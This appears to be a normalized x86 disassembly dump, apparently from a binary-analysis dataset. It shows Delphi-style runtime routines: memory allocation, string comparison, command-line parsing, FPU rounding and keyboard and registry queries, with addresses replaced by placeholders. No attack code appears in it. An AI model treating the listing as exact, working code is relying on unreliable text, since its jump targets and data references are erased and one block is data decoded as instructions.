or eax 0x2
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
add eax 0x4
call sub_401c94
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] 0x7
jmp r-xdata
sub_401f0c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi esp
call sub_401ec0
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax rw-data
call sub_401440
mov ebx [ esp + 0x8 ]
test ebx ebx
jne r-xdata
mov eax [ edi ]
cmp ebx eax
jae r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi ]
add eax [ edi + 0x4 ]
mov esi ebx
add esi [ esp + 0xc ]
cmp eax esi
jae r-xdata
call sub_401ce0
sub [ edi ] eax
add [ edi + 0x4 ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
add eax [ edi + 0x4 ]
cmp esi eax
jne r-xdata
call sub_401d50
add [ edi + 0x4 ] eax
mov eax [ edi ]
mov [ rw-data ] eax
mov eax [ edi + 0x4 ]
mov [ rw-data ] eax
mov al 0x1
sub eax 0x4
mov edx 0x4
call sub_401c64
sub [ edi + 0x4 ] 0x4
sub_401f98
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
lea eax [ ebx + 0x4 ]
call sub_4017ec
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401f0c
test al al
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov al 0x1
sub_401fc4
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_40187c
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401f0c
test al al
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_401ff8
xor edx edx
test eax eax
jns r-xdata
sar eax 0x2
cmp eax 0x400
jg r-xdata
add eax 0x3
mov eax edx
retn
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
jne r-xdata
inc eax
cmp eax 0x401
jne r-xdata
sub_402024
push ebx
push esi
push edi
push ebp
mov esi eax
mov edi rw-data
mov ebp rw-data
mov eax ebx
call sub_401bd0
mov edx [ ebx + 0x8 ]
mov eax edx
sub eax esi
cmp eax 0xc
jl r-xdata
mov ebx [ edi ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov esi edx
cmp ebx [ edi ]
jne r-xdata
mov edx ebx
add edx esi
xchg edx eax
call sub_401e38
jmp r-xdata
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
and [ eax ] 0xfffffffe
mov eax [ ebx + 0x4 ]
mov [ edi ] eax
mov eax ebx
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
mov ebx [ ebx + 0x4 ]
cmp esi [ ebx + 0x8 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x8 ] eax
cmp ebx [ edi ]
je r-xdata
cmp esi 0x1000
jg r-xdata
mov [ edi ] ebx
jmp r-xdata
mov eax esi
call sub_401f98
test al al
jne r-xdata
mov eax esi
call sub_401ff8
mov ebx eax
test ebx ebx
jne r-xdata
cmp esi [ ebp ]
jg r-xdata
xor eax eax
jmp r-xdata
mov ebx [ rw-data ]
cmp esi [ ebx + 0x8 ]
jle r-xdata
sub [ ebp ] esi
cmp [ ebp ] 0xc
jge r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
add [ rw-data ] esi
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
jmp r-xdata
add esi [ ebp ]
xor eax eax
mov [ ebp ] eax
sub_402118
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
cmp ebx 0x7ffffff8
jle r-xdata
call sub_401a2c
test al al
je r-xdata
xor ecx ecx
push ebp
push sub_402294
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
add ebx 0x7
and ebx 0xfffffffc
cmp ebx 0xc
jge r-xdata
push rw-data
call sub_401388
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
cmp ebx 0x1000
jg r-xdata
mov ebx 0xc
cmp ebx [ rw-data ]
jg r-xdata
mov eax ebx
test eax eax
jns r-xdata
mov eax ebx
call sub_402024
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub [ rw-data ] ebx
cmp [ rw-data ] 0xc
jge r-xdata
sar eax 0x2
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
je r-xdata
add eax 0x3
retn
push rw-data
call sub_401390
mov eax [ rw-data ]
add [ rw-data ] ebx
mov edx ebx
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_403bc8
jmp r-xdata
add ebx [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edx
mov eax esi
add eax ebx
and [ eax ] 0xfffffffe
mov eax [ edx + 0x4 ]
cmp edx eax
jne r-xdata
mov ecx ebx
test ecx ecx
jns r-xdata
mov eax ebx
test eax eax
jns r-xdata
sar ecx 0x2
mov edi [ rw-data ]
mov [ edi + ecx * 4 - 0xc ] eax
mov ecx [ edx ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x4 ] eax
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
add ecx 0x3
sar eax 0x2
mov ecx [ rw-data ]
xor edi edi
mov [ ecx + eax * 4 - 0xc ] edi
jmp r-xdata
add eax 0x3
mov eax esi
mov edx [ edx + 0x8 ]
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_403bc8
jmp r-xdata
sub_4022a8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
push ebp
push sub_40243a
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_401a2c
test al al
jne r-xdata
mov esi ebx
sub esi 0x4
mov ebx [ esi ]
test bl 0x2
jne r-xdata
push rw-data
call sub_401388
mov [ rw-data ] 0x8
mov [ ebp - 0x4 ] 0x8
jmp r-xdata
dec [ rw-data ]
mov eax ebx
and eax 0x7ffffffc
sub eax 0x4
sub [ rw-data ] eax
test bl 0x1
je r-xdata
mov [ rw-data ] 0x9
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
and ebx 0x7ffffffc
mov eax esi
add eax ebx
mov edi eax
cmp edi [ rw-data ]
jne r-xdata
mov eax esi
sub eax 0xc
mov edx [ eax + 0x8 ]
cmp edx 0xc
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
test dl 0x2
je r-xdata
sub [ rw-data ] ebx
add [ rw-data ] ebx
cmp [ rw-data ] 0x3c00
jle r-xdata
mov [ rw-data ] 0xa
jmp r-xdata
test edx 0x80000003
je r-xdata
retn
push rw-data
call sub_401390
mov eax edi
cmp [ eax + 0x4 ] 0x0
je r-xdata
and edx 0x7ffffffc
cmp edx 0x4
jge r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
call sub_403bc8
jmp r-xdata
call sub_401ec0
mov eax esi
sub eax edx
cmp edx [ eax + 0x8 ]
je r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
or [ eax ] 0x1
jmp r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
add ebx edx
mov esi eax
call sub_401bd0
mov [ rw-data ] 0xa
jmp r-xdata
cmp [ eax + 0x8 ] 0xc
jge r-xdata
mov edx ebx
mov eax esi
call sub_401e38
mov edx [ eax + 0x8 ]
add ebx edx
call sub_401bd0
sub_40244c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
add esi 0x7
and esi 0xfffffffc
cmp esi 0xc
jge r-xdata
mov ebp eax
sub ebp 0x4
mov edi [ ebp ]
and edi 0x7ffffffc
mov eax ebp
add eax edi
mov ebx eax
cmp edi esi
jne r-xdata
mov esi 0xc
cmp edi esi
jle r-xdata
mov al 0x1
jmp r-xdata
mov eax esi
sub eax edi
mov [ esp + 0x4 ] eax
cmp ebx [ rw-data ]
jne r-xdata
mov edx edi
sub edx esi
mov [ esp ] edx
cmp ebx [ rw-data ]
jne r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp eax [ esp + 0x4 ]
jl r-xdata
mov ebx eax
test [ ebx ] 0x2
jne r-xdata
mov eax [ esp ]
sub [ rw-data ] eax
mov eax [ esp ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
mov edx ebx
mov eax edx
mov ecx [ eax + 0x8 ]
mov [ esp ] ecx
mov ecx [ esp ]
cmp ecx [ esp + 0x4 ]
jge r-xdata
call sub_401ec0
mov ebx ebp
add ebx edi
mov eax [ esp + 0x4 ]
sub [ rw-data ] eax
mov eax [ esp + 0x4 ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
cmp [ esp ] 0xc
jl r-xdata
mov eax ebx
mov edx [ eax + 0x8 ]
add [ esp ] edx
call sub_401bd0
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
mov eax [ esp ]
add [ rw-data ] eax
mov eax [ esp ]
sub [ rw-data ] eax
mov esi edi
jmp r-xdata
xor eax eax
jmp r-xdata
and eax 0x7ffffffc
add eax ebx
mov ebx eax
mov edx [ esp + 0x4 ]
mov eax ebx
call sub_401fc4
test al al
je r-xdata
call sub_401bd0
mov eax [ esp + 0x4 ]
sub [ esp ] eax
cmp [ esp ] 0xc
jl r-xdata
add edx [ esp ]
mov ebx edx
mov eax [ esp ]
sub [ esp + 0x4 ] eax
jmp r-xdata
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
jmp r-xdata
mov eax [ rw-data ]
add [ rw-data ] eax
add esi [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edi
jmp r-xdata
mov ebx ebp
add ebx esi
mov eax [ esp ]
or eax 0x2
mov [ ebx ] eax
mov eax ebx
add eax 0x4
call sub_401c94
jmp r-xdata
mov ebx ebp
add ebx edi
jmp r-xdata
add esi [ esp ]
mov ebx ebp
add ebx esi
and [ ebx ] 0xfffffffe
jmp r-xdata
mov eax ebp
add eax esi
mov edx [ esp ]
call sub_401e38
jmp r-xdata
sub_402628
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_4026d9
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_401a2c
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_40244c
test al al
je r-xdata
push rw-data
call sub_401388
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax esi
call sub_402118
mov edi eax
mov eax ebx
sub eax 0x4
mov eax [ eax ]
and eax 0x7ffffffc
sub eax 0x4
cmp esi eax
jge r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
test edi edi
je r-xdata
mov eax esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov [ ebp - 0x4 ] edi
mov edx edi
mov ecx ebx
xchg ecx eax
call sub_4028e8
mov eax ebx
call sub_4022a8
retn
push rw-data
call sub_401390
sub_4026ec
push ebx
test eax eax
jle r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
mov al 0x1
call sub_402848
sub_40270c
push ebx
test eax eax
je r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov al 0x2
call sub_402848
sub_40272c
mov ecx [ eax ]
test ecx ecx
je r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
retn
push eax
mov eax edx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov [ eax ] edx
mov eax ecx
call [ rw-data ]
or eax eax
jne r-xdata
push eax
mov eax ecx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov al 0x1
jmp sub_402848
mov [ ecx ] eax
mov al 0x2
jmp sub_402848
retn
mov [ ecx ] eax
retn
sub_4027bc
push ebx
push esi
call sub_406234
cmp [ eax ] 0x0
je r-xdata
xor ebx ebx
call sub_406234
mov esi [ eax ]
mov ebx [ esi + 0x8 ]
call sub_406234
xor eax eax
mov [ esi + 0x8 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_4027fc
push ebx
push esi
mov esi edx
mov ebx eax
and bl 0x7f
cmp [ rw-data ] 0x0
je r-xdata
test bl bl
jne r-xdata
mov edx esi
mov eax ebx
call [ rw-data ]
cmp bl 0x18
ja r-xdata
call sub_406234
mov ebx [ eax + 0x4 ]
jmp r-xdata
xor eax eax
mov al bl
mov edx esi
call sub_4027f0
xor eax eax
mov al bl
mov bl [ eax + rw-data ]
sub_402884
push esi
push edi
mov esi eax
mov edi [ esp + 0xc ]
xor eax eax
or al [ esi ]
je r-xdata
mov [ edi ] al
test edx edx
jle r-xdata
mov edx 0x1
jmp r-xdata
cmp edx eax
jg r-xdata
sub eax edx
inc eax
test ecx ecx
jl r-xdata
xor ecx ecx
jmp r-xdata
cmp ecx eax
jg r-xdata
add esi edx
mov [ edi ] cl
inc edi
[ edi ] [ esi ]
jmp r-xdata
mov ecx eax
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_4028e8
push esi
push edi
mov esi eax
mov edi edx
mov eax ecx
cmp edi esi
ja r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
sar ecx 0x2
js r-xdata
je r-xdata
pop edi
pop esi
retn
std
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
add esi 0x3
add edi 0x3
[ edi ] [ esi ]
cld
sar ecx 0x2
js r-xdata
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_402928
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
jmp r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp [ ebx ] 0x22
jne r-xdata
cmp al 0x20
jbe r-xdata
xor ebp ebp
mov edi ebx
jmp r-xdata
cmp [ ebx + 0x1 ] 0x22
jne r-xdata
push ebx
call sub_40123c
mov ebx eax
mov al [ ebx ]
cmp al 0x20
ja r-xdata
add ebx 0x2
jmp r-xdata
cmp al 0x22
jne r-xdata
mov eax esi
mov edx ebp
call sub_4047b0
mov ebx edi
mov edi [ esi ]
xor esi esi
jmp r-xdata
push ebx
call sub_40123c
mov edx eax
sub edx ebx
add ebp edx
mov ebx eax
push ebx
call sub_40123c
mov ebx eax
jmp r-xdata
mov al [ ebx ]
cmp al 0x20
ja r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp al 0x22
jne r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx ] 0x0
je r-xdata
cmp al 0x22
jne r-xdata
push ebx
call sub_40123c
cmp eax ebx
jbe r-xdata
push ebx
call sub_40123c
mov ebx eax
jmp r-xdata
push ebx
call sub_40123c
mov ebx eax
jmp r-xdata
push ebx
call sub_40123c
mov edx eax
sub edx ebx
add ebp edx
mov ebx eax
mov dl [ ebx ]
mov [ edi + esi ] dl
inc ebx
inc esi
cmp eax ebx
ja r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp al 0x22
jne r-xdata
push ebx
call sub_40123c
mov ebx eax
jmp r-xdata
push ebx
call sub_40123c
cmp eax ebx
jbe r-xdata
mov dl [ ebx ]
mov [ edi + esi ] dl
inc ebx
inc esi
cmp eax ebx
ja r-xdata
sub_402a14
push ebp
mov ebp esp
push 0x0
push ebx
push esi
xor eax eax
push ebp
push sub_402a65
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
call GetCommandLineA
lea edx [ ebp - 0x4 ]
call sub_402928
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_402a6c
lea eax [ ebp - 0x4 ]
call sub_404164
retn
inc esi
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_402928
mov ebx eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_402a74
push ebx
push esi
push edi
add esp 0xfffffef8
mov ebx edx
mov esi eax
mov eax ebx
call sub_404164
test esi esi
jne r-xdata
call GetCommandLineA
mov edi eax
push 0x105
lea eax [ esp + 0x4 ]
push eax
push 0x0
call sub_40128c
mov ecx eax
mov edx esp
mov eax ebx
call sub_404254
jmp r-xdata
add esp 0x108
pop edi
pop esi
pop ebx
retn
cmp [ ebx ] 0x0
je r-xdata
dec esi
jmp r-xdata
mov edx ebx
mov eax edi
call sub_402928
mov edi eax
test esi esi
je r-xdata
sub_402af8
fld st0
sub esp 0x4
fnstcw [ esp ]
fnstcw [ esp + 0x2 ]
fwait
or [ esp + 0x2 ] 0xf00
fldcw [ esp + 0x2 ]
frndint
fwait
fldcw [ esp ]
add esp 0x4
fsubp st1
retn
sub_402b28
sub esp 0xc
fnstcw [ esp ]
fnstcw [ esp + 0x2 ]
fwait
or [ esp + 0x2 ] 0xf00
fldcw [ esp + 0x2 ]
fistp [ esp + 0x4 ]
fwait
fldcw [ esp ]
pop ecx
pop eax
pop edx
retn
sub_402b68
push ebx
mov cx [ eax + 0x4 ]
sub cx 0xd7b1
je r-xdata
xor ebx ebx
jmp r-xdata
dec ecx
sub cx 0x2
jae r-xdata
test ebx ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov ebx edx
call ebx
mov ebx eax
jmp r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_402874
xor ebx ebx
jmp r-xdata
cmp eax rw-data
jne r-xdata
mov ebx 0x67
sub_402bbc
push ebx
push esi
mov ebx eax
xor esi esi
mov ax [ ebx + 0x4 ]
cmp ax 0xd7b1
jb r-xdata
cmp ebx rw-data
je r-xdata
cmp ax 0xd7b3
ja r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax 0x67
call sub_402874
and ax 0xd7b2
cmp ax 0xd7b2
jne r-xdata
test esi esi
jne r-xdata
mov eax ebx
call [ ebx + 0x1c ]
mov esi eax
test esi esi
je r-xdata
mov eax ebx
call [ ebx + 0x24 ]
mov esi eax
mov eax esi
call sub_402874
jmp r-xdata
sub_402c14
push ebx
mov bl [ edx ]
cmp cl bl
jbe r-xdata
mov [ eax ] cl
inc edx
inc eax
and ecx 0xff
xchg edx eax
call sub_4028e8
pop ebx
retn
mov ecx ebx
sub_402c30
push ebx
push esi
push edi
mov esi eax
mov edi edx
xor eax eax
xor edx edx
mov al [ esi ]
mov dl [ edi ]
inc esi
inc edi
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cl [ esi ]
cmp cl [ edi ]
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
pop edi
pop esi
pop ebx
retn
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
mov cl [ esi + 0x1 ]
cmp cl [ edi + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ esi + 0x2 ]
cmp cl [ edi + 0x2 ]
jne r-xdata
sub_402cb4
push ebx
push esi
push ecx
mov esi ecx
shr esi 0x2
je r-xdata
pop esi
and esi 0x3
je r-xdata
mov ecx [ eax ]
mov ebx [ edx ]
cmp ecx ebx
jne r-xdata
pop esi
pop ebx
retn
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
pop esi
cmp cl bl
jne r-xdata
dec esi
je r-xdata
dec esi
je r-xdata
cmp ch bh
jne r-xdata
add eax 0x4
add edx 0x4
mov ecx [ eax + 0x4 ]
mov ebx [ edx + 0x4 ]
cmp ecx ebx
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov cl [ eax + 0x1 ]
cmp cl [ edx + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add eax 0x8
add edx 0x8
dec esi
jne r-xdata
dec esi
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ eax + 0x2 ]
cmp cl [ edx + 0x2 ]
jne r-xdata
sub_402d24
push edi
mov edi eax
mov ch cl
mov eax ecx
shl eax 0x10
mov ax cx
mov ecx edx
sar ecx 0x2
js r-xdata
pop edi
retn
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
sub_402d44
push ebx
push esi
push edi
mov esi eax
push eax
test eax eax
je r-xdata
inc esi
jmp r-xdata
xor eax eax
xor ebx ebx
mov edi 0xccccccc
pop ebx
sub esi ebx
jmp r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x20
je r-xdata
mov ch 0x0
cmp bl 0x2d
je r-xdata
mov [ edx ] esi
pop edi
pop esi
pop ebx
retn
inc ch
cmp bl 0x2b
je r-xdata
cmp bl 0x24
je r-xdata
mov bl [ esi ]
inc esi
jmp r-xdata
mov edi 0xfffffff
mov bl [ esi ]
inc esi
test bl bl
je r-xdata
cmp bl 0x78
je r-xdata
cmp bl 0x61
jb r-xdata
cmp bl 0x58
je r-xdata
sub bl 0x30
cmp bl 0x9
jbe r-xdata
sub bl 0x20
cmp bl 0x30
jne r-xdata
cmp eax edi
ja r-xdata
sub bl 0x11
cmp bl 0x5
ja r-xdata
test bl bl
je r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x78
je r-xdata
shl eax 0x4
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
add bl 0xa
sub bl 0x30
cmp bl 0x9
ja r-xdata
cmp bl 0x58
je r-xdata
dec ch
jne r-xdata
cmp eax edi
ja r-xdata
test bl bl
je r-xdata
pop ecx
xor esi esi
neg eax
lea eax [ eax + eax * 4 ]
add eax eax
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
dec ch
je r-xdata
jmp r-xdata
neg eax
jle r-xdata
test eax eax
jge r-xdata
js r-xdata
jmp r-xdata
sub_402e24
push ebx
push eax
cmp ecx 0xff
jbe r-xdata
mov bl [ edx ]
inc edx
test bl bl
je r-xdata
mov ecx 0xff
pop edx
sub eax edx
mov [ edx ] al
pop ebx
retn
inc eax
mov [ eax ] bl
dec ecx
jne r-xdata
sub_402e48
push ebx
push esi
push edi
xor ebx ebx
mov bl ah
movzx esi al
movzx edx dl
mov edi ecx
mov ecx ebx
xor eax eax
[ edi ]
sub edi ebx
shl ebx 0x3
cmp edx ebx
jb r-xdata
cmp esi edx
ja r-xdata
lea edx [ ebx - 0x1 ]
pop edi
pop esi
pop ebx
retn
dec eax
mov ecx esi
and cl 0x7
shl al cl
shr esi 0x3
mov cl dl
not cl
and cl 0x7
shr ah cl
shr edx 0x3
add edi esi
mov ecx edx
sub ecx esi
jne r-xdata
stosb [ edi ]
dec ecx
mov al 0xff
[ edi ]
mov [ edi ] ah
and al ah
mov [ edi ] al
jmp r-xdata
sub_402ebc
push ebx
xor ebx ebx
test eax eax
jl r-xdata
neg eax
cmp eax 0x1400
jge r-xdata
je r-xdata
fstp st0
fldz
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402f6f ]
fdivp st1
shr eax 0x5
je r-xdata
pop ebx
retn
cmp eax 0x1400
jge r-xdata
mov edx eax
and edx 0xf
je r-xdata
fstp st0
fld [ ebx + r-xdata ]
jmp r-xdata
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402f6f ]
fmulp st1
shr eax 0x5
je r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fdivp st1
mov edx eax
and edx 0xf
je r-xdata
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fdivp st1
jmp r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fmulp st1
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fmulp st1
jmp r-xdata
sub_402f6f
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3fff ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4002 ] ah
add [ eax ] al
add [ eax ] al
add al cl
add eax 0x40
add [ eax ] al
add [ eax ] al
cli
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x64 ] al
or al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
retn
sub_4031a8
push ebx
xor ebx ebx
push 0x0
call GetKeyboardType
cmp eax 0x7
jne r-xdata
mov eax ebx
pop ebx
retn
push 0x1
call GetKeyboardType
and eax 0xff00
cmp eax 0xd00
je r-xdata
mov bl 0x1
cmp eax 0x400
jne r-xdata
sub_4031d8
push ebp
mov ebp esp
add esp 0xfffffff4
movzx eax [ rw-data ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push 0x0
push r-xdata
push 0x80000002
call sub_4012e4
test eax eax
jne r-xdata
mov ax [ rw-data ]
and ax 0xffc0
mov dx [ ebp - 0x8 ]
and dx 0x3f
or ax dx
mov [ rw-data ] ax
mov esp ebp
pop ebp
retn
xor eax eax
push ebp
push sub_403249
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4012ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4012dc
retn
sub_4032cc
push ebx
xor ebx ebx
or edx edx
je r-xdata
mov al bl
pop ebx
retn
mov eax [ eax - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
dec edx
dec ecx
jne r-xdata
mov bh [ ecx + eax ]
xor bh [ ecx + edx ]
and bh 0xdf
jne r-xdata
inc ebx
sub_403374
push ebx
push esi
push edi
mov ebx eax
mov edi edx
stosd [ edi ]
mov ecx [ ebx - 0x28 ]
xor eax eax
push ecx
shr ecx 0x2
dec ecx
[ edi ]
pop ecx
and ecx 0x3
[ edi ]
mov eax edx
mov edx esp
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
push ecx
cmp esp edx
je r-xdata
mov ebx [ ebx ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
pop ebx
mov ecx [ ebx ]
add ebx 0x4
mov ecx [ ebx - 0x48 ]
test ecx ecx
je r-xdata
add ebx 0x1c
dec ecx
jne r-xdata
mov edi [ ebx + 0x14 ]
mov [ edi + eax ] esi
mov esi [ ebx + 0x10 ]
test esi esi
je r-xdata
cmp esp edx
jne r-xdata
sub_4033cc
push ebx
push esi
mov ebx eax
mov esi eax
test esi esi
jne r-xdata
call sub_404bb4
mov eax ebx
mov esi [ esi ]
mov edx [ esi - 0x40 ]
mov esi [ esi - 0x24 ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
sub_4033ec
xchg ecx edx
cmp ecx 0xff000000
jae r-xdata
and ecx 0xffffff
add ecx eax
mov eax edx
mov edx [ ecx ]
jmp sub_405b1c
cmp ecx 0xfe000000
jb r-xdata
jmp ecx
movsx ecx cx
add ecx [ eax ]
jmp [ ecx ]
sub_40341c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_4034a0
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ esi ] eax
